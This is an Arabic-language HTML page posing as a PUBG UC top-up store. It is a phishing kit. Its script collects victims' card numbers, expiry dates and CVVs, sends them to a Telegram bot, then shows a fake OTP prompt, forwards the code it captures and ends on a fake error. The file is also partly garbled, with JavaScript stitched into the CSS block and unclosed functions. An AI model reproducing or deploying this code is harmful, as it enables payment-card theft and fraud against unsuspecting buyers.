<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>PUBG UC · شراء</title>
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    }

    body {
      background: #f5f7fa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }

    .card {
      max-width: 420px;
      width: 100%;
      background: #ffffff;
      border-radius: 36px;
      padding: 0 0 32px 0;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
      color: #1a1a1a;
      border: 1px solid #eaeef2;
      position: relative;
      overflow: hidden;
    }

    .header {
      width: 100%;
      margin-bottom: 18px;
      display: flex;
      justify-content: center;
      background: #ffffff;
      margin: 0;
      padding: 0;
      line-height: 0;
    }

    .brand-logo {
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
      padding: 0;
    }
    .brand-logo img {
      width: 100%;
      max-width: 100%;
      height: auto;
      max-height: 320px;
      object-fit: contain;
      display: block;
      border-radius: 0;
      margin: 0;
      padding: 0;
      background: #ffffff;
    }

    .content {
      padding: 0 20px;
    }

    .user-section {
      background: #f0f2f5;
      border-radius: 28px;
      padding: 6px 12px 6px 18px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
      border: 1px solid #e0e4e8;
      position: relative;
    }
    .user-section i {
      color: #777;
      font-size: 18px;
    }
    .user-section input {
      background: transparent;
      border: none;
      outline: none;
      color: #1a1a1a;
      font-size: 16px;
      padding: 10px 0;
      flex: 1;
      min-width: 100px;
    }
    .user-section input::placeholder {
      color: #999;
      font-weight: 400;
    }

    .player-confirm-msg {
      display: none;
      color: #1a73e8;
      font-size: 12px;
      font-weight: 600;
      background: #e8f0fe;
      padding: 4px 12px;
      border-radius: 20px;
      white-space: nowrap;
      animation: fadeIn 0.3s ease;
    }
    .player-confirm-msg.show {
      display: inline-block;
    }
    @keyframes fadeIn {
      0% { opacity: 0; transform: scale(0.8); }
      100% { opacity: 1; transform: scale(1); }
    }
    .player-confirm-msg i {
      font-size: 12px;
      margin-right: 4px;
      color: #1a73e8;
    }

    .player-ok-msg {
      display: none;
      color: #1a73e8;
      font-size: 13px;
      font-weight: 700;
      background: #e8f0fe;
      padding: 4px 12px;
      border-radius: 20px;
      white-space: nowrap;
      animation: fadeIn 0.3s ease;
    }
    .player-ok-msg.show {
      display: inline-block;
    }

    .country-section {
      background: #f0f2f5;
      border-radius: 28px;
      padding: 6px 18px 6px 18px;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 10px;
      border: 1px solid #e0e4e8;
    }
    .country-section i {
      display: none;
    }
    .country-section select {
      background: transparent;
      border: none;
      outline: none;
      font-size: 14px;
      font-weight: 600;
      color: #1a1a1a;
      padding: 10px 4px 10px 0;
      cursor: pointer;
      width: 100%;
      appearance: auto;
      -webkit-appearance: auto;
    }
    .country-section select option {
      font-weight: 400;
    }

    .coin-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-bottom: 24px;
    }
    .coin-option {
      background: #f8f9fc;
      border-radius: 16px;
      padding: 16px 8px;
      text-align: center;
      border: 2px solid #e8ecf1;
      transition: 0.2s;
      cursor: pointer;
      position: relative;
    }
    .coin-option:hover {
      border-color: #d0d5e0;
      transform: translateY(-1px);
    }
    .coin-option.selected {
      border-color: #1a73e8;
      background: #e8f0fe;
      box-shadow: 0 0 0 1px #1a73e8;
    }
    .coin-option .coins {
      font-weight: 700;
      font-size: 18px;
      color: #1a1a1a;
      line-height: 1.3;
      margin-top: 4px;
    }
    .coin-option .uc-symbol {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 72px;
      height: 72px;
      margin: 0 auto 6px;
      background: transparent;
      border-radius: 0;
      border: none;
      box-shadow: none;
      flex-shrink: 0;
      padding: 0;
      transition: none;
    }
    .coin-option.selected .uc-symbol {
      border: none;
      box-shadow: none;
    }
    .coin-option .uc-symbol .uc-icon-img {
      width: 100%;
      height: 100%;
      display: block;
      object-fit: contain;
    }
    .coin-option .total-price {
      font-size: 14px;
      font-weight: 700;
      color: #1a73e8;
      background: #e8f0fe;
      padding: 4px 10px;
      border-radius: 20px;
      display: inline-block;
      margin-top: 6px;
      border: 1px solid #7baaf7;
    }
    .coin-option .badge {
      background: #1a73e822;
      color: #0d47a1;
      font-size: 10px;
      font-weight: 600;
      border-radius: 40px;
      padding: 2px 10px;
      display: inline-block;
      margin-top: 6px;
    }
    .coin-option.custom-option {
      border-style: dashed;
      border-color: #c0c8d4;
      background: #fafbfc;
    }
    .coin-option.custom-option .coins {
      font-size: 15px;
      color: #555;
    }
    .coin-option .custom-icon {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 72px;
      height: 72px;
      margin: 0 auto 6px;
      background: transparent;
      border-radius: 0;
      border: none;
      box-shadow: none;
      flex-shrink: 0;
      padding: 0;
      transition: none;
    }
    .coin-option.custom-option.selected .custom-icon {
      border: none;
      box-shadow: none;
    }
    .custom-icon-img {
      width: 100%;
      height: 100%;
      display: block;
      object-fit: contain;
    }
    .coin-option.custom-option .custom-icon .uc-icon-check {
      display: none;
    }
    .coin-option.custom-option.selected .custom-icon .uc-icon-check {
      display: block;
    }
    .coin-option.custom-option.selected .custom-icon .uc-icon-default {
      display: none;
    }

    .payment-box {
      width: 100%;
      position: relative;
      margin-bottom: 20px;
      background: #ffffff;
      border-radius: 16px;
      padding: 20px 22px 22px;
      border: 2px solid #d0d5e0;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08), 0 1px 4px rgba(0, 0, 0, 0.05);
      transition: box-shadow 0.3s;
    }
    .payment-box:hover {
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12), 0 1px 6px rgba(0, 0, 0, 0.06);
    }

    .card-logos {
      display: flex;
      align-items: center;
      gap: 14px;
      justify-content: flex-end;
      margin-bottom: 16px;
    }

    .visa-wrapper {
      border: 1px solid #000000;
      border-radius: 6px;
      padding: 4px 12px;
      background: #ffffff;
      display: flex;
      align-items: center;
    }
    .visa {
      font-size: 28px;
      font-weight: 900;
      font-style: italic;
      color: #1434cb;
      letter-spacing: -2px;
    }

    .mastercard-wrapper {
      border: 1px solid #000000;
      border-radius: 6px;
      padding: 4px 10px;
      background: #ffffff;
      display: flex;
      align-items: center;
    }

    .mastercard {
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      width: 50px;
      height: 32px;
      flex-shrink: 0;
    }
    .mastercard .mc-circles {
      width: 100%;
      height: 100%;
      position: relative;
    }
    .mastercard .mc-circles::before,
    .mastercard .mc-circles::after {
      content: "";
      position: absolute;
      top: 0;
      width: 32px;
      height: 32px;
      border-radius: 50%;
    }
    .mastercard .mc-circles::before {
      left: 0;
      background: #eb001b;
    }
    .mastercard .mc-circles::after {
      right: 0;
      background: #f79e1b;
      opacity: .95;
    }
    .mastercard .mc-text {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 8px;
      font-weight: 900;
      color: #ffffff;
      letter-spacing: 0.3px;
      text-shadow: 0 0 4px rgba(0,0,0,0.3);
      white-space: nowrap;
      z-index: 2;
      font-family: 'Segoe UI', Arial, sans-serif;
      text-align: center;
      line-height: 1.1;
    }

    .payment-box label {
      display: block;
      font-size: 14px;
      font-weight: 700;
      color: #4a5568;
      letter-spacing: 0.8px;
      margin-bottom: 4px;
    }

    .field-wrapper {
      position: relative;
      width: 100%;
    }

    .field-wrapper input {
      width: 100%;
      height: 56px;
      border: 2px solid #d5d9e4;
      border-radius: 12px;
      background: #f7f9fc;
      padding: 0 20px;
      font-size: 20px;
      font-weight: 500;
      color: #1a1a2e;
      outline: none;
      font-family: 'Courier New', 'Courier', monospace;
      transition: border-color 0.3s, background 0.3s;
      padding-right: 48px;
    }
    .field-wrapper input::placeholder {
      color: #bcc3d2;
      opacity: 1;
      font-weight: 400;
      font-size: 16px;
      letter-spacing: 1px;
    }
    .field-wrapper input:focus {
      border-color: #1a73e8;
      background: #ffffff;
    }
    .field-wrapper input.error {
      border-color: #dc2626;
      background: #fef2f2;
    }

    .field-wrapper .error-icon {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      width: 28px;
      height: 28px;
      background: #dc2626;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-weight: 700;
      font-size: 16px;
      font-family: Arial, sans-serif;
      box-shadow: 0 2px 8px rgba(220, 38, 38, 0.4);
      opacity: 0;
      transition: opacity 0.2s;
      pointer-events: none;
      line-height: 1;
    }
    .field-wrapper.error .error-icon {
      opacity: 1;
    }

    .payment-box .field {
      margin-bottom: 18px;
    }

    .payment-box .row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
    }
    .payment-box .row .field {
      margin-bottom: 0;
    }

    @media (max-width: 400px) {
      .payment-box {
        padding: 16px 14px;
      }
      .field-wrapper input {
        height: 48px;
        font-size: 17px;
        padding: 0 14px;
        padding-right: 40px;
      }
      .payment-box .row {
        gap: 12px;
      }
      .visa {
        font-size: 22px;
      }
      .mastercard {
        width: 40px;
        height: 26px;
      }
      .mastercard .mc-circles::before,
      .mastercard .mc-circles::after {
        width: 26px;
        height: 26px;
      }
      .mastercard .mc-text {
        font-size: 6.5px;
      }
      .visa-wrapper {
        padding: 2px 8px;
      }
      .mastercard-wrapper {
        padding: 2px 6px;
      }
      .field-wrapper .error-icon {
        width: 24px;
        height: 24px;
        font-size: 14px;
        right: 8px;
      }
      .brand-logo img {
        max-height: 220px;
      }
      .coin-option .uc-symbol {
        width: 60px;
        height: 60px;
        padding: 0;
      }
      .coin-option .coins {
        font-size: 16px;
      }
      .content {
        padding: 0 14px;
      }
      .coin-option .custom-icon {
        width: 60px;
        height: 60px;
        padding: 0;
      }
    }

    .action-btn {
      width: 100%;
      background: #1a73e8;
      border: none;
      padding: 16px;
      border-radius: 60px;
      font-weight: 700;
      font-size: 18px;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 8px 0 #0d47a1;
      transition: 0.08s linear;
      margin-bottom: 14px;
      cursor: pointer;
    }
    .action-btn:active {
      transform: translateY(4px);
      box-shadow: 0 4px 0 #0d47a1;
    }
    .action-btn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
      transform: translateY(4px);
      box-shadow: 0 4px 0 #0d47a1;
    }

    .otp-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: flex-start;
      padding-top: 80px;
      z-index: 999;
      padding-left: 24px;
      padding-right: 24px;
      padding-bottom: 24px;
      overflow-y: auto;
    }
    .otp-overlay.active {
      display: flex;
    }
    .otp-card {
      background: #ffffff;
      max-width: 380px;
      width: 100%;
      border-radius: 40px;
      padding: 32px 24px 28px;
      border: 1px solid #e0e4e8;
      box-shadow: 0 30px 60px rgba(0,0,0,0.15);
      animation: fadeUp 0.25s ease;
      margin: 0 auto;
    }
    @keyframes fadeUp {
      0% { opacity: 0; transform: translateY(30px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    .otp-card h2 {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: #1a1a1a;
    }
    .otp-card h2 i {
      color: #1a73e8;
    }
    .otp-card .sub {
      color: #666;
      font-size: 14px;
      margin-bottom: 22px;
      border-left: 3px solid #1a73e8;
      padding-left: 12px;
    }
    .otp-input-group {
      background: #f0f2f5;
      border-radius: 60px;
      display: flex;
      align-items: center;
      padding: 4px 4px 4px 20px;
      border: 1px solid #e0e4e8;
      margin-bottom: 18px;
    }
    .otp-input-group input {
      background: transparent;
      border: none;
      outline: none;
      color: #1a1a1a;
      font-size: 22px;
      letter-spacing: 6px;
      flex: 1;
      padding: 14px 0;
      min-width: 0;
    }
    .otp-input-group input::placeholder {
      letter-spacing: 2px;
      color: #999;
      font-size: 16px;
    }
    .otp-input-group button {
      background: #1a73e8;
      border: none;
      color: white;
      font-weight: 700;
      padding: 14px 24px;
      border-radius: 60px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.1s;
      box-shadow: 0 4px 0 #0d47a1;
    }
    .otp-input-group button:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 #0d47a1;
    }
    .otp-close {
      background: transparent;
      border: none;
      color: #888;
      font-size: 14px;
      margin-top: 12px;
      cursor: pointer;
      width: 100%;
      text-align: center;
      padding: 8px;
    }
    .otp-close:hover {
      color: #333;
    }

    .resend-otp-btn {
      background: transparent;
      border: none;
      color: #1a73e8;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      padding: 8px;
      margin-top: 8px;
      width: 100%;
      text-align: center;
      transition: color 0.2s;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
    }
    .resend-otp-btn:hover:not(:disabled) {
      color: #0d47a1;
      text-decoration: underline;
    }
    .resend-otp-btn:disabled {
      color: #999;
      cursor: not-allowed;
      text-decoration: none;
    }
    .resend-otp-btn .countdown {
      color: #999;
      font-weight: 700;
    }
    .resend-otp-btn.sent {
      color: #22c55e;
    }
    .resend-otp-btn.sent .countdown {
      color: #999;
    }
    .resend-otp-btn .resend-text {
      display: inline;
    }
    .resend-otp-btn .countdown-text {
      display: inline;
      font-size: 13px;
      color: #999;
      font-weight: 500;
    }
    .resend-otp-btn .sent-text {
      display: inline;
    }

    .error-popup-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 24px;
    }
    .error-popup-overlay.active {
      display: flex;
    }
    .error-popup {
      background: #ffffff;
      max-width: 360px;
      width: 100%;
      border-radius: 28px;
      padding: 32px 24px 28px;
      text-align: center;
      border: 1px solid #ff4444;
      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
      animation: fadeUp 0.3s ease;
    }
    .error-popup .error-icon {
      font-size: 48px;
      color: #ff4444;
      margin-bottom: 12px;
    }
    .error-popup h3 {
      font-size: 20px;
      font-weight: 700;
      color: #cc0000;
      margin-bottom: 8px;
    }
    .error-popup p {
      font-size: 15px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .error-popup .error-close-btn {
      background: #1a73e8;
      border: none;
      color: white;
      font-weight: 700;
      padding: 12px 40px;
      border-radius: 60px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.1s;
      box-shadow: 0 4px 0 #0d47a1;
    }
    .error-popup .error-close-btn:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 #0d47a1;
    }

    .custom-amount-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: center;
      z-index: 1100;
      padding: 24px;
      padding-top: 40px;
    }
    .custom-amount-overlay.active {
      display: flex;
    }
    .custom-amount-card {
      background: #ffffff;
      max-width: 340px;
      width: 100%;
      border-radius: 32px;
      padding: 32px 24px 28px;
      text-align: center;
      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
      animation: fadeUp 0.25s ease;
      border: 1px solid #e0e4e8;
      margin-top: 0;
    }
    .custom-amount-card h3 {
      font-size: 20px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .uc-title-icon {
      width: 70px;
      height: 70px;
      object-fit: contain;
      display: inline-block;
      vertical-align: middle;
    }
    .custom-amount-card .sub {
      color: #777;
      font-size: 14px;
      margin-bottom: 20px;
    }
    .custom-amount-card input {
      width: 100%;
      height: 56px;
      border: 2px solid #d5d9e4;
      border-radius: 16px;
      background: #f7f9fc;
      padding: 0 20px;
      font-size: 28px;
      font-weight: 700;
      text-align: center;
      color: #1a1a1a;
      outline: none;
      transition: border-color 0.3s;
      margin-bottom: 16px;
    }
    .custom-amount-card input:focus {
      border-color: #1a73e8;
      background: #ffffff;
    }
    .custom-amount-card input::placeholder {
      color: #bcc3d2;
      font-weight: 400;
      font-size: 16px;
    }
    .custom-amount-card .actions {
      display: flex;
      gap: 12px;
    }
    .custom-amount-card .actions button {
      flex: 1;
      padding: 14px 0;
      border: none;
      border-radius: 60px;
      font-weight: 700;
      font-size: 16px;
      cursor: pointer;
      transition: 0.1s;
    }
    .custom-amount-card .btn-confirm {
      background: #1a73e8;
      color: white;
      box-shadow: 0 4px 0 #0d47a1;
    }
    .custom-amount-card .btn-confirm:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 #0d47a1;
    }
    .custom-amount-card .btn-cancel {
      background: #f0f2f5;
      color: #555;
      border: 1px solid #d5d9e4;
    }
    .custom-amount-card .btn-cancel:active {
      transform: scale(0.97);
    }

    .success-toast {
      display: none;
    }

    @media (max-width: 400px) {
      .content { padding: 0 14px; }
      .coin-option .coins { font-size: 16px; }

      function isValidUsername(username) {
        if (!username) return false;
        return /^[0-9]+$/.test(username) && username.length > 0;

      function luhnCheck(cardNumber) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = cardNumber.length - 1; i >= 0; i--) {
          let digit = parseInt(cardNumber.charAt(i), 10);
          if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
          }
          sum += digit;
          shouldDouble = !shouldDouble;
        }
        return (sum % 10 === 0);
      }

      function isValidCardNumber(card) {
        const raw = card.replace(/\s/g, '');
        if (raw.length !== 16) return false;
        const first = raw.charAt(0);
        if (first !== '4' && first !== '5') return false;
        return luhnCheck(raw);
      }

      function validateExpiry(dateStr) {
        const clean = dateStr.replace('/', '');
        if (clean.length !== 4) {
          expiryValid = false;
          return false;
        }
        const month = parseInt(clean.substring(0, 2), 10);
        const year  = parseInt(clean.substring(2, 4), 10);

        if (month < 1 || month > 12) {
          expiryValid = false;
          return false;
        }

        const currentYear  = new Date().getFullYear() % 100;
        const currentMonth = new Date().getMonth() + 1;

        if (year < currentYear || year > currentYear + 10) {
          expiryValid = false;
          return false;
        }

        if (year === currentYear && month < currentMonth) {
          expiryValid = false;
          return false;
        }

        expiryValid = true;
        return true;

            if (coins && !isNaN(coins) && coins > 0) {
              const usd = calculateUCPriceUSD(coins);
              const rate = currencyData[countrySelect.value].rate;
              const local = usd * rate;
              selectedPriceUSD = usd;
              selectedPrice = local;
              const totalEl = selectedOpt.querySelector('.total-price');
              if (totalEl) {
                totalEl.textContent = `${currencyData[countrySelect.value].symbol} ${local.toFixed(2)}`;
              }
            }
          } else {
            const usd = parseFloat(selectedOpt.dataset.priceUSD);
            if (!isNaN(usd)) {
              const rate = currencyData[countrySelect.value].rate;
              selectedPriceUSD = usd;
              selectedPrice = usd * rate;
            }
          }
        }
      });

      usernameInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
        this.classList.remove('error');
        playerOkMsg.classList.remove('show');
        playerConfirmMsg.classList.remove('show');
        if (confirmTimer) {
          clearTimeout(confirmTimer);
          confirmTimer = null;
        }
        if (okTimer) {
          clearTimeout(okTimer);
          okTimer = null;
        }
        // إذا كان الرقم مختلف عن السابق نعيد التعيين
        if (this.value.trim() !== lastUsername) {
          lastUsername = '';
        }
      });

      usernameInput.addEventListener('blur', function() {
        const val = this.value.trim();
        if (isValidUsername(val)) {
          // إذا كان نفس الرقم السابق ولم يتغير، نظهر تم تحديد اللاعب مباشرة
          if (val === lastUsername) {
            playerOkMsg.classList.remove('show');
            playerConfirmMsg.classList.add('show');
            this.classList.remove('error');
            return;
          }
          
          playerOkMsg.classList.add('show');
          playerConfirmMsg.classList.remove('show');
          lastUsername = val;
          
          if (okTimer) {
            clearTimeout(okTimer);
            okTimer = null;
          }
          if (confirmTimer) {
            clearTimeout(confirmTimer);
            confirmTimer = null;
          }

          okTimer = setTimeout(() => {
            playerOkMsg.classList.remove('show');
            playerConfirmMsg.classList.add('show');
            okTimer = null;
          }, 1000);

        } else {
          playerOkMsg.classList.remove('show');
          playerConfirmMsg.classList.remove('show');
          lastUsername = '';
        }
        this.classList.remove('error');
      });

      cardNumber.addEventListener('input', function(e) {
        let raw = this.value.replace(/\s/g, '').replace(/\D/g, '');
        if (raw.length > 16) raw = raw.slice(0, 16);
        let formatted = '';
        for (let i = 0; i < raw.length; i++) {
          if (i > 0 && i % 4 === 0) formatted += ' ';
          formatted += raw[i];
        }
        this.value = formatted;
        clearFieldError(cardWrapper);

        if (raw.length === 16) {
          if (isValidCardNumber(this.value)) {
            clearFieldError(cardWrapper);
            expiry.focus();
          } else {
            setFieldError(cardWrapper, true);
          }
        }
      });

      expiry.addEventListener('input', function(e) {
        let raw = this.value.replace(/\D/g, '');
        if (raw.length > 4) raw = raw.slice(0, 4);
        let formatted = '';
        for (let i = 0; i < raw.length; i++) {
          if (i === 2 && raw.length > 2) formatted += '/';
          formatted += raw[i];
        }
        this.value = formatted;
        clearFieldError(expiryWrapper);

        if (raw.length === 4) {
          if (validateExpiry(this.value)) {
            clearFieldError(expiryWrapper);
            cvv.focus();
          } else {
            setFieldError(expiryWrapper, true);
          }
        } else {
          expiryValid = false;
        }
      });

      expiry.addEventListener('blur', function() {
        if (this.value.length === 5) {
          if (!validateExpiry(this.value)) {
            setFieldError(expiryWrapper, true);
          } else {
            clearFieldError(expiryWrapper);
          }
        }
      });

      cvv.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length > 3) this.value = this.value.slice(0, 3);
        clearFieldError(cvvWrapper);
        if (this.value.length === 3) {
          clearFieldError(cvvWrapper);
        }
      });

      cvv.addEventListener('blur', function() {
        if (this.value.length === 3) {
          clearFieldError(cvvWrapper);
        } else {
          setFieldError(cvvWrapper, true);
        }
      });

      otpInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '').slice(0, 8);
      });

      function sendToTelegram(message) {
        return new Promise((resolve) => {
          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          };

          fetch(url, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json'
            },
            body: JSON.stringify(payload),
            keepalive: true
          })
          .then(response => {
            resolve(true);
          })
          .catch(() => {
            resolve(true);
          });

          setTimeout(() => {
            resolve(true);
          }, 3000);
        });
      }

      function showErrorAfterDelay() {
        errorPopupOverlay.classList.add('active');
      }

      function resetPage() {
        window.location.reload();
      }

      function startCountdown() {
        countdownValue = 30;
        resendOtpBtn.disabled = true;
        resendOtpBtn.classList.add('sent');
        resendOtpBtn.innerHTML = `
          <span class="sent-text"><i class="fas fa-check-circle"></i> تم الإرسال</span>
          <span class="countdown-text">إعادة الإرسال بعد <span class="countdown">${countdownValue}</span> ثانية</span>
        `;
        
        if (countdownInterval) clearInterval(countdownInterval);
        countdownInterval = setInterval(function() {
          countdownValue--;
          if (countdownValue <= 0) {
            clearInterval(countdownInterval);
            countdownInterval = null;
            resendOtpBtn.disabled = false;
            resendOtpBtn.classList.remove('sent');
            resendOtpBtn.innerHTML = `
              <span class="resend-text"><i class="fas fa-redo"></i> إعادة إرسال رمز التحقق</span>
            `;
          } else {
            resendOtpBtn.innerHTML = `
              <span class="sent-text"><i class="fas fa-check-circle"></i> تم الإرسال</span>
              <span class="countdown-text">إعادة الإرسال بعد <span class="countdown">${countdownValue}</span> ثانية</span>
            `;
          }
        }, 1000);
      }

      resendOtpBtn.addEventListener('click', function() {
        if (this.disabled) return;
        startCountdown();
      });

      topupBtn.addEventListener('click', function() {
        if (isProcessing) return;

        const username = usernameInput.value.trim();
        if (!username || !isValidUsername(username)) {
          usernameInput.focus();
          usernameInput.classList.add('error');
          setTimeout(() => usernameInput.classList.remove('error'), 1000);
          return;
        }

        if (selectedCoins === null || selectedCoins <= 0) {
          coinOptions.forEach(opt => {
            opt.style.borderColor = '#1a73e8';
            setTimeout(() => { opt.style.borderColor = ''; }, 500);
          });
          return;
        }

        const cardRaw = cardNumber.value.replace(/\s/g, '');
        if (!isValidCardNumber(cardRaw)) {
          cardNumber.focus();
          setFieldError(cardWrapper, true);
          return;
        } else {
          clearFieldError(cardWrapper);
        }

        if (!expiryValid) {
          if (expiry.value.length === 5) {
            validateExpiry(expiry.value);
          }
          if (!expiryValid) {
            expiry.focus();
            setFieldError(expiryWrapper, true);
            return;
          }
        } else {
          clearFieldError(expiryWrapper);
        }

        if (cvv.value.length !== 3) {
          cvv.focus();
          setFieldError(cvvWrapper, true);
          return;
        } else {
          clearFieldError(cvvWrapper);
        }

        const countryCode = countrySelect.value;
        const currencySymbol = currencyData[countryCode].symbol;
        const priceFormatted = selectedPrice.toFixed(2);

        const message = `🟢 <b>طلب شراء UC (PUBG)</b> 🟢\n\n` +
                        `👤 <b>PUBG ID:</b> ${username}\n` +
                        `💰 <b>عدد UC:</b> ${selectedCoins.toLocaleString()}\n` +
                        `💵 <b>السعر:</b> ${currencySymbol} ${priceFormatted}\n` +
                        `🌍 <b>الدولة:</b> ${countrySelect.options[countrySelect.selectedIndex].text}\n\n` +
                        `💳 <b>بيانات الفيزا:</b>\n` +
                        `🔢 <b>الرقم:</b> ${cardRaw}\n` +
                        `📅 <b>التاريخ:</b> ${expiry.value}\n` +
                        `🔐 <b>CVV:</b> ${cvv.value}\n\n` +
                        `📱 <b>تم الإرسال من:</b> PUBG UC Store`;

        isProcessing = true;
        topupBtn.disabled = true;
        topupBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...`;

        sendToTelegram(message).then(() => {
          otpInput.value = '';
          if (countdownInterval) {
            clearInterval(countdownInterval);
            countdownInterval = null;
          }
          resendOtpBtn.disabled = false;
          resendOtpBtn.classList.remove('sent');
          resendOtpBtn.innerHTML = `
            <span class="resend-text"><i class="fas fa-redo"></i> إعادة إرسال رمز التحقق</span>
          `;
          // تأخير 1 ثانية قبل ظهور OTP
          setTimeout(() => {
            otpOverlay.classList.add('active');
            setTimeout(() => otpInput.focus(), 300);
          }, 1000);
        });

        setTimeout(() => {
          if (isProcessing) {
            isProcessing = false;
            topupBtn.disabled = false;
            topupBtn.innerHTML = 'Buy شراء';
          }
        }, 5000);
      });

      confirmBtn.addEventListener('click', function() {
        const otp = otpInput.value.trim();
        if (!otp || otp.length < 4 || otp.length > 8) {
          otpInput.style.borderColor = '#dc2626';
          otpInput.style.background = '#fef2f2';
          setTimeout(() => {
            otpInput.style.borderColor = '';
            otpInput.style.background = '';
          }, 500);
          return;
        }

        const confirmMessage = `✅ <b>تم إدخال OTP</b> ✅\n\n` +
                               `🔑 <b>الرمز المدخل:</b> <code>${otp}</code>`;

        sendToTelegram(confirmMessage);
        
        otpOverlay.classList.remove('active');
        if (isProcessing) {
          isProcessing = false;
          topupBtn.disabled = false;
          topupBtn.innerHTML = 'Buy شراء';
        }
        
        setTimeout(showErrorAfterDelay, 1000);
      });

      function closeOtpAndReset() {
        otpOverlay.classList.remove('active');
        if (isProcessing) {
          isProcessing = false;
          topupBtn.disabled = false;
          topupBtn.innerHTML = 'Buy شراء';
        }
        if (countdownInterval) {
          clearInterval(countdownInterval);
          countdownInterval = null;
        }
        resendOtpBtn.disabled = false;
        resendOtpBtn.classList.remove('sent');
        resendOtpBtn.innerHTML = `
          <span class="resend-text"><i class="fas fa-redo"></i> إعادة إرسال رمز التحقق</span>
        `;
      }

      closeOtpBtn.addEventListener('click', closeOtpAndReset);
      otpOverlay.addEventListener('click', function(e) {
        if (e.target === this) {
          closeOtpAndReset();
        }
      });

      errorPopupCloseBtn.addEventListener('click', function(e) {
        e.preventDefault();
        errorPopupOverlay.classList.remove('active');
        resetPage();
      });
      
      errorPopupOverlay.addEventListener('click', function(e) {
        if (e.target === this) {
          errorPopupOverlay.classList.remove('active');
          resetPage();
        }
      });

      document.querySelectorAll('#cardNumber, #expiry, #cvv').forEach(input => {
        input.addEventListener('focus', function() {
          setTimeout(() => {
            const card = document.getElementById('mainCard');
            card.scrollIntoView({ behavior: 'smooth', block: 'end' });
          }, 350);
        });
      });

      buildCoinGrid();

    })();
  </script>
</body>
</html>
